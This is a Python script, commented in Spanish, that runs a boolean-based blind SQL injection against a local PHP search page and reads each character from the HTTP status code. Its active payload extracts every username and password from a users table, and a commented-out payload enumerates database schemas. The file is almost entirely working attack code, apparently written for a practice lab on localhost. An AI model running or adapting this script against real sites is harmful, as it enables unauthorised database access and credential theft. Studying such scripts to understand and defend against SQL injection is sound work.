#!/usr/bin/python3
'''
    Script para realizar una inyeccion sql basada en condiciones a partir del codigo de respuesta de la web
'''
from pwn import *
import signal
import sys
import requests
import time
import string

URL="http://localhost/searchUsers.php"
CHARACTERS = string.printable

#Ctrl+C

def def_handler(sig,frame):
    print("\n\n Saliendo......")
    sys.exit(1)
    
signal.signal(signal.SIGINT, def_handler)

def makeSQLI():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    extracted_info=""
    #Se contempla 100 posiciones ya que no se sabe cuantos caracteres tiene la data en la BD
    for position in range (1,100):
        #Se contempla del 33 al 122 ya que son el equivalente en ASCII de los caracteres que se pueden usar en una contraseña
        #Validar con man ascii en linux
        for character in range (33,126):
            #Enumerar BD
            #sqli_url=URL+"?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1)=%d)" % (position,character)
            #Enumerar usuarios y contraseñas
            sqli_url=URL+"?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" % (position,character)
            p1.status(sqli_url)
            r=requests.get(sqli_url)
            if r.status_code== 200:
                extracted_info+=(chr(character))
                p2.status(extracted_info)
                break
        

if __name__== '__main__':
    
    makeSQLI()
    